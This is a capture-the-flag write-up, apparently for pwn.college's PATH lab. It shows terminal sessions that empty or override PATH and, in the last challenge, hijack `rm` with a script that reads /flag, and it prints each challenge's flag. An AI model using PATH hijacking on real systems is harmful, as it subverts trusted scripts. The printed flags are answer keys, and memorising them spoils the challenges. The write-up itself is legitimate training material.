# Pondering PATH

## The PATH variable
The `PATH` variable bstores a bunch of directory paths in which the shell searches for programs corresponding to commands.

Here we need to need to disrupt the operation of the `/challenge/run` program, which will _delete_ the flag file using the `rm` command. Thus we need to empty the PATH variable by `PATH=""` so that the `rm` command cannot be accessed at all.
```
hacker@path~the-path-variable:~$ PATH=""
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: No such file or directory
The flag is still there! I might as well give it to you!
pwn.college{gqao23IPsASutTSUrH0-o7WuuTE.dZzNwUDL5gDO0czW}
hacker@path~the-path-variable:~$
```
flag:`pwn.college{gqao23IPsASutTSUrH0-o7WuuTE.dZzNwUDL5gDO0czW}` 

## Setting PATH
Here, `/challenge/run` will run the `win` command via its bare name, but this command exists in the `/challenge/more_commands/` directory, which is not initially in the `PATH`. Thus we need to overwrite `PATH` with `/challenge/more_commands/`
```
hacker@path~setting-path:~$ PATH="/challenge/more_commands/"
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{4Iep5h3NRaGi5hu7TO6A_Nded7I.dVzNyUDL5gDO0czW}
hacker@path~setting-path:~$
```
flag: `pwn.college{4Iep5h3NRaGi5hu7TO6A_Nded7I.dVzNyUDL5gDO0czW}`

## Adding Commands
In this challenge, `win` does not exist. We need to make a shell script called `win`, add its location to the `PATH`, and use `/challenge/run` to find it.
But because of this, the system won't be able to find commands like `cat`. Thus we need to use some other method get the flag.

We first create a directory called `xyz`. Then inside it, we create a `win` script inside which we add `cat /flag`, and then to find which folder is `cat` in, we use `echo $PATH`.
```
hacker@path~adding-commands:~$ mkdir xyz
hacker@path~adding-commands:~$ cd xyz
hacker@path~adding-commands:~/xyz$ touch win
hacker@path~adding-commands:~/xyz$ nano win
hacker@path~adding-commands:~/xyz$ echo $PATH
/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~adding-commands:~/xyz$ chmod a+x win
hacker@path~adding-commands:~/xyz$ PATH="/usr/bin:~/xyz"
hacker@path~adding-commands:~/xyz$ /challenge/run
Invoking 'win'....
pwn.college{0RSXyzXiQqnsFnype5t1qmrQtku.dZzNyUDL5gDO0czW}
hacker@path~adding-commands:~/xyz$
```
flag:`pwn.college{0RSXyzXiQqnsFnype5t1qmrQtku.dZzNyUDL5gDO0czW}`

## Hijacking Commands
Here, running `/challenge/run` will delete the flag using the `rm` command, without printing out anything. In order to prevent that, we need to override `rm` with absolute path of `cat` (from last challenge) to safely get the flag
```
hacker@path~hijacking-commands:~$ mkdir hjk
hacker@path~hijacking-commands:~$ cd hjk
hacker@path~hijacking-commands:~/hjk$ echo "/usr/bin/cat /flag" > rm
hacker@path~hijacking-commands:~/hjk$ chmod a+rwx rm
hacker@path~hijacking-commands:~/hjk$ PATH="~/hjk"
hacker@path~hijacking-commands:~/hjk$ /challenge/run
Trying to remove /flag...
pwn.college{0K84swVdDpLbOX9b2Rhm0KT9ePK.ddzNyUDL5gDO0czW}
hacker@path~hijacking-commands:~/hjk$
```
flag: `pwn.college{0K84swVdDpLbOX9b2Rhm0KT9ePK.ddzNyUDL5gDO0czW}`
